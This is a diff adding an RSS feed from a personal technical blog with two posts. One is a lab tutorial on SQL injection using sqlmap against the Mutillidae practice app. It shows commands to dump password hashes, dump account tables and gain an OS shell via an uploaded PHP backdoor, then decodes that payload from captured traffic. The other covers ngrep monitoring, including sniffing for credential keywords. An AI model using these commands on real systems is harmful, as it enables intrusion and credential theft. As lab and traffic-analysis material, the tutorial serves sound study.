@@ -1,0 +1,279 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ngrep on Technical Notes</title>
+    <link>https://tzyluen.github.io/tags/ngrep/index.xml</link>
+    <description>Recent content in Ngrep on Technical Notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2015. All rights reserved.</copyright>
+    <atom:link href="https://tzyluen.github.io/tags/ngrep/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SQL injection with sqlmap</title>
+      <link>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</link>
+      <pubDate>Sat, 07 May 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/sql-injection-with-sqlmap/</guid>
+      <description>
+
+&lt;h1 id=&#34;scan-for-vulnerability&#34;&gt;Scan for vulnerability&lt;/h1&gt;
+
+&lt;h2 id=&#34;create-a-http-request-file&#34;&gt;Create a HTTP request file&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Use &lt;code&gt;-r&lt;/code&gt; option instead of passing long parameters of &lt;code&gt;--url&lt;/code&gt;, &lt;code&gt;--user-agent&lt;/code&gt;, etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; use packet capture utility such as &lt;code&gt;ngrep&lt;/code&gt; to facilitate the process.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sqlmap -r REQUESTFILE ...
+-r REQUESTFILE      Load HTTP request from a file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-01.png&#34; alt=&#34;sql-injection-with-sqlmap-01&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Clean-up the trailing &lt;code&gt;.&lt;/code&gt; (non-printable char displayed by &lt;code&gt;ngrep&lt;/code&gt;), and write to a file e.g., &lt;code&gt;mutillidae-login.request&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-02.png&#34; alt=&#34;sql-injection-with-sqlmap-02&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;scan-the-target&#34;&gt;Scan the target&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Launch the scan with the &lt;code&gt;-r&lt;/code&gt; and use the request file created above, it will take some time:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r -mutillidae-login.request --batch --banner
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-03.png&#34; alt=&#34;sql-injection-with-sqlmap-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Once a vulnerability is found, it will print the parameter that&amp;rsquo;s vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;boolean-based blind&lt;/li&gt;
+&lt;li&gt;error-based&lt;/li&gt;
+&lt;li&gt;AND/OR time-based blind&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-04.png&#34; alt=&#34;sql-injection-with-sqlmap-04&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the &lt;code&gt;--technique&lt;/code&gt; option can be used to specifically target one type of attack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; --technique=BEUSTQ,
+   B=boolean-based blind, E=error-based, U=union-query-based, S=stacked queries,
+   T=time-based blind, Q=inline queries
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;explore-the-vulnerable-target-s-databases-and-system&#34;&gt;Explore the vulnerable target&amp;rsquo;s databases and system&lt;/h2&gt;
+
+&lt;p&gt;Once entered the system:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Crack the passwords&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --passwords
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-05.png&#34; alt=&#34;sql-injection-with-sqlmap-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;List the databases:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dbs
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-06.png&#34; alt=&#34;sql-injection-with-sqlmap-06&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;List the tables:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-07.png&#34; alt=&#34;sql-injection-with-sqlmap-07&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Dump the &lt;code&gt;nowasp.accounts&lt;/code&gt; table:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-08.png&#34; alt=&#34;sql-injection-with-sqlmap-08&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;some-other-commonly-used-options-to-explore-the-system&#34;&gt;Some other commonly used options to explore the system:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --current-user
+$ sqlmap -r mutillidae-login.request --privileges
+$ sqlmap -r mutillidae-login.request --dbms=mysql -D mysql --sql-query=&amp;quot;select user,password from mysql.user order by user desc&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;os-shell-access&#34;&gt;OS Shell Access&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; see section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt; to retrieve the payloads.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --os-shell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-09.png&#34; alt=&#34;sql-injection-with-sqlmap-09&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;behind-the-scene&#34;&gt;Behind the scene&lt;/h3&gt;
+
+&lt;p&gt;The file stager (1) &lt;code&gt;tmpuntbv.php&lt;/code&gt; is first uploaded to the &lt;code&gt;/var/www/html&lt;/code&gt; as explained in section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then, the backdoor (2) &lt;code&gt;tmpbyovw.php&lt;/code&gt; is uploaded to the server through &lt;code&gt;tmpuntbv.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-14.png&#34; alt=&#34;sql-injection-with-sqlmap-14&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All shell commands&amp;rsquo; requests are made through the backdoor script &lt;code&gt;tmpbyovw.php&lt;/code&gt; to 192.168.1.9 and results are returned to the 192.168.1.11.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-13.png&#34; alt=&#34;sql-injection-with-sqlmap-13&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;speedup-the-process-and-specify-custom-injection-payloads&#34;&gt;Speedup the process and specify custom injection payloads&lt;/h2&gt;
+
+&lt;p&gt;To speedup the process, pass as many parameters to shorten the processing time. For examples:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p TESTPARAMETER      Testable parameter(s)
+--dbms=DBMS           Force back-end DBMS to this value
+--technique=TECH      SQL injection techniques to use (default &amp;quot;BEUSTQ&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/h1&gt;
+
+&lt;p&gt;From the sqlmap stdout, pins down the files (payloads) uploaded:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-10.png&#34; alt=&#34;sql-injection-with-sqlmap-10&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;with-ngrep&#34;&gt;with Ngrep&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ngrep -d eth0 -qt -W byline &amp;quot;^GET | ^POST&amp;quot; &amp;quot;port 80 and host 192.168.1.11&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Look for the files uploaded described above:
+&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-11.png&#34; alt=&#34;sql-injection-with-sqlmap-11&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;with-wireshark&#34;&gt;with Wireshark&lt;/h2&gt;
+
+&lt;p&gt;Use the following filters:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Capture filter: not broadcast and not multicast and host 192.168.1.11
+Display filter (1): http contains &amp;quot;tmpuntbv.php&amp;quot;
+Display filter (2): http contains &amp;quot;tmpbyovw.php&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the matching packet, &lt;code&gt;Follow&lt;/code&gt; &amp;rarr; &lt;code&gt;HTTP Stream&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-12.png&#34; alt=&#34;sql-injection-with-sqlmap-12&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;decode-the-payload&#34;&gt;Decode the payload&lt;/h2&gt;
+
+&lt;p&gt;Unquote the url strings with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import sys
+import urlparse
+import codecs
+buf = urlparse.unquote(sys.argv[1])
+print buf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;produces,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-15.png&#34; alt=&#34;sql-injection-with-sqlmap-15&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and decodes the hex (starting from &lt;del&gt;0x&lt;/del&gt;3c3f&amp;hellip; until &amp;hellip;3e0a) with,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload = sys.argv[1]
+print codecs.decode(payload, &amp;quot;hex&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;produces,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-16.png&#34; alt=&#34;sql-injection-with-sqlmap-16&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the code basically handling file uploads and also change the uploaded files permission to &lt;code&gt;0755&lt;/code&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Ngrep: quick peek at http traffic</title>
+      <link>https://tzyluen.github.io/post/ngrep-quick-peek-at-http-traffic/</link>
+      <pubDate>Sat, 16 Apr 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/ngrep-quick-peek-at-http-traffic/</guid>
+      <description>
+
+&lt;h3 id=&#34;quick-peek&#34;&gt;Quick peek:&lt;/h3&gt;
+
+&lt;p&gt;Monitor activities on device &lt;code&gt;eth0 port 80&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;-W byline&lt;/code&gt;: linefeeds (LF) are printed as linefeeds, more readable.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;-qt&lt;/code&gt;: quiet mode and print human-readable timestamp.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -W byline -qt port 80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;sorts-out-unique-user-agent-devices&#34;&gt;Sorts out unique User-Agent (devices):&lt;/h3&gt;
+
+&lt;p&gt;In corporate environment, desktop/laptop OS build is often standardized. However, with the BYOD initiative, the network has becomes even more vulnerable. To quickly identify the type of devices on the network, we could do:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo ngrep -qt -W single -d eth0 -P~ &#39;User-Agent:&#39; &#39;port 80&#39; &amp;gt; http-user-agent.txt
+$ sed &#39;s/.*User-Agent/User-Agent/&#39; http-user-agent.txt | sed &#39;s/~.*//&#39; | sed &#39;/^$/d&#39; &amp;gt; user-agents.txt
+$ cat user-agents.txt | sort | uniq -c | sort -rn
+  28 User-Agent: Chrome 20.0.1092.0 (Win 7)&amp;quot; useragent=&amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6
+   7 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36
+   5 User-Agent: Chrome 15.0.874.120 (Vista)&amp;quot; useragent=&amp;quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2
+   4 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or use &lt;code&gt;tshark&lt;/code&gt; :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo tshark -i eth0 -f &amp;quot;port 80&amp;quot; -Y &amp;quot;http contains \&amp;quot;User-Agent:\&amp;quot;&amp;quot; -Tfields -e http.user_agent &amp;gt; user-agents.txt
+$ cat user-agents.txt | sort | uniq -c | sort -rn
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;monitor-the-occurrence-of-the-keywords&#34;&gt;Monitor the occurrence of the keywords:&lt;/h3&gt;
+
+&lt;p&gt;Capture network traffic matches tcp port 80 (HTTP) on GET/POST methods:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -q -i &amp;quot;^GET |^POST &amp;quot; tcp and port 80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Monitor the occurrence of the words &lt;code&gt;user&lt;/code&gt; or &lt;code&gt;pass&lt;/code&gt;, case insensitive:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -d eth0 -wi &#39;user | pass&#39; port 80
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Read from a pcap file, search for &lt;code&gt;GET&lt;/code&gt; and &lt;code&gt;POST&lt;/code&gt; requests:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -W byline -I capture.pcap | grep &#39;GET\|POST&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;ip-address&#34;&gt;IP address:&lt;/h3&gt;
+
+&lt;p&gt;Matches all headers containing pattern string &amp;lsquo;HTTP&amp;rsquo; sent to/from ip address starting with 172.16&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -I capture.pcap &#39;HTTP&#39; &#39;host 172.16&#39; | grep &#39;GET\|POST&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/ngrep-quick-peek-at-http-traffic-01.png&#34; alt=&#34;ngrep-quick-peek-at-http-traffic-01&#34; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;dns&#34;&gt;DNS:&lt;/h3&gt;
+
+&lt;p&gt;Capture incoming/outgoing to/from eth0 matches DNS queries/responses&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# ngrep -qt -W byline -d eth0 udp and port 53
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
